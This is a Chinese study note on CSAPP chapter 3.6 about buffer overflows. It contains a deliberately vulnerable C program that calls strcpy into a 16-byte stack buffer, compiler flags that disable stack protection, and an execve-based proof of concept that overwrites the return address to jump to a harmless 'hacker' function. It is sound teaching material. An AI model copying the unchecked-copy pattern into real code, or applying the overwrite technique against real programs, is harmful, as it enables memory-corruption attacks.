---
title: 'Chapter III-6'
description: 'CSAPP NOTE CHAP III-6'
order: 9
---

# Chap 3.6 越界访问和缓冲区攻击

## 缓冲区溢出

**定义** C 语言没有对数组的边界作出约束，因此访问下标可能越界，称为 **缓冲区溢出**

例如：

1. char s[10];
2. s[10] = -1; // 越界
3. char *p = s;
4. *(p + 13) = 40; // 越界

​	第 2 行、第 4 行的数组访问，都超出了数组的边界，产生了缓冲区溢出。

## 缓冲区溢出攻击

**原理** 由于数组/缓冲区是局部变量，都放在堆栈段里，而程序的返回点也在堆栈段里，因此利用缓冲区溢出修改对应返回点，让程序跳进自己的恶意代码即可攻击。

**原因** 没有对栈中作为缓冲区的数组做越界检查。

**例子** 利用缓冲区溢出转到自设的程序 hacker 去执行 outputs 漏洞：当命令行中字符串超 25 个字符时，使用 `strcpy` 函数就会使缓冲 buffer 造成写溢出并破坏返址

```c
#include "stdio.h"
#include "string.h"
void outputs(char *str) 
{ 
    char buffer[16]; 
    strcpy(buffer,str); 
    printf("%s \n", buffer);
}
void hacker(void)
{
    printf("being hacked\n");
}
int main(int argc, char *argv[])
{
    outputs(argv[1]);
    return 0;
}
```

> 编译时，关闭堆栈保护和 PIE (Position Independent Executable), 编译命令为
>
> `gcc -g -m32 -fno-stack-protector -no-pie -fno-pic -o test test.c`

由于无法从控制台直接输入 ascii 码，因此编写一个程序调用 execve() 系统函数，启动 test 可执行程序，并注入攻击字符串。

```c
// exec.c
#include "stdio.h"
char code[] = 
  "0123456789ABCDEF0123456789AB"
  "\xc5\x91\x04\x08"
  "\x00";
int main(void) 
{
  char *arg[3];
  arg[0] = "./test";
  arg[1] = code;
  arg[2] = NULL;
  execve(arg[0], arg, NULL);
  return 0;
}
```

运行结果如下：

![image-20251022144318401](https://img.nkns.cc/PicGo/image-20251022144318401.png)

因为 `"\xc5\x91\x04\x08"` 这里是对应的程序返回地址，这里将它覆盖成了 `0x080491c5` ，成功执行 hacker 函数。